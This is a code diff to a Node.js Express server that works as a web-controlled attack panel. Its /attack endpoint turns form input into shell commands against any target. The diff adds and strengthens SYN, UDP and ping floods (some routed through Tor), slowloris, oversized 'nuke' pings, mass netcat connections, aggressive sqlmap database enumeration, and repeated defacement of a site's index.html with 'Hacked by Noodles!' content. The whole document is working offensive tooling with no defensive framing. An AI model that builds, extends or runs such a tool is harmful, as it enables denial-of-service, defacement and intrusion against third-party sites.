@@ -5,6 +5,7 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const publicIp = require('public-ip');
+const rateLimit = require('express-rate-limit');
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
@@ -21,11 +22,21 @@ const log = (message) => {
     console.log(logMessage.trim());
 };
 
+const apiLimiter = rateLimit({
+	windowMs: 15 * 60 * 1000,
+	max: 10,
+	message: 'Too many requests, try again after 15 minutes',
+	standardHeaders: true,
+	legacyHeaders: false,
+});
+
+app.use('/attack', apiLimiter);
+
 app.post('/attack', async (req, res) => {
     const target = req.body.target;
     const attackType = req.body.attackType;
     const duration = parseInt(req.body.duration) || 60;
-    const intensity = parseInt(req.body.intensity) || 100; // New intensity parameter
+    const intensity = parseInt(req.body.intensity) || 100;
 
     if (!target) {
         log('Error: Target URL is required.');
@@ -33,42 +44,53 @@ app.post('/attack', async (req, res) => {
     }
 
     let command = '';
+    const numThreads = os.cpus().length * 4;
+    const encodedTarget = encodeURIComponent(target);
 
     switch (attackType) {
         case 'ddos':
-            // Improved DDoS: Multi-pronged attack using multiple tools
-            const numThreads = os.cpus().length * 2; // Use multiple threads based on CPU cores
-            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${target} & done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${encodedTarget} & done; done"`;
             break;
         case 'deface':
-            // Deface: Inject a script to continuously replace the content
-            const defaceScript = `<script>
-                setInterval(function() {
-                    document.body.innerHTML = '<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">'; // Replace with shock image
-                    document.title = 'Noodles Hacked You!';
-                }, 100);
-            </script>`;
-            command = `curl -X PUT -d '${defaceScript}' ${target}/index.html`;
+            const defaceScript = `<h1>Hacked by Noodles!</h1><img src="https://i.imgur.com/xxxxx.gif" style="width: 100%; height: auto;">`;
+            const encodedDefaceScript = Buffer.from(defaceScript).toString('base64');
+            command = `timeout ${duration} bash -c "while true; do curl -X PUT -H 'Content-Type: text/html' -d $'${defaceScript}' ${encodedTarget}/index.html & done"`;
             break;
         case 'connect':
-            // Connect: Attempt to establish multiple connections
-            command = `timeout ${duration} bash -c "for i in $(seq 500); do nc -v ${target} 80 & done"`;
+            command = `timeout ${duration} bash -c "for i in $(seq 1000); do while true; do nc -v ${encodedTarget} 80 & done; done"`;
             break;
         case 'tor_ddos':
-             try {
+           try {
                 const externalIp = await publicIp.v4();
                 log(`Attacker IP: ${externalIp}`);
-
-                // Tor DDoS: Route hping3 traffic through Tor
-                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do proxychains4 hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${target} & done"`;
+                command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do proxychains4 hping3 -c ${intensity * 100} -d 120 -S -u -p 80 --flood ${encodedTarget} & done; done"`;
             } catch (error) {
                 log(`Error getting public IP: ${error.message}`);
                 return res.status(500).send(`Error getting public IP: ${error.message}`);
             }
             break;
         case 'sql_inject':
-            command = `sqlmap --url "${target}" --dbs --batch --level 5 --risk 3`;
+             command = `sqlmap --url "${encodedTarget}" --dbs --batch --level 5 --risk 3`;
+             break;
+        case 'slowloris':
+            command = `timeout ${duration} perl slowloris.pl -dns ${encodedTarget} -port 80 -num ${intensity * 50}`;
             break;
+
+        case 'udp_flood':
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 --udp -s 53 -p 53 --flood --rand-source ${encodedTarget} & done; done"`;
+            break;
+
+        case 'syn_flood':
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do hping3 -S --flood --rand-source ${encodedTarget} & done; done"`;
+            break;
+
+        case 'ping_flood':
+            command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -f ${encodedTarget} & done; done"`;
+            break;
+
+        case 'nuke':
+             command = `timeout ${duration} bash -c "for i in $(seq ${numThreads}); do while true; do ping -s 65500 ${encodedTarget} & done; done"`;
+             break;
 
         default:
             log(`Error: Invalid attack type: ${attackType}`);
@@ -106,4 +128,3 @@ app.listen(PORT, () => {
     console.log(`Server listening on port ${PORT}`);
     log(`Server started on port ${PORT}`);
 });
-
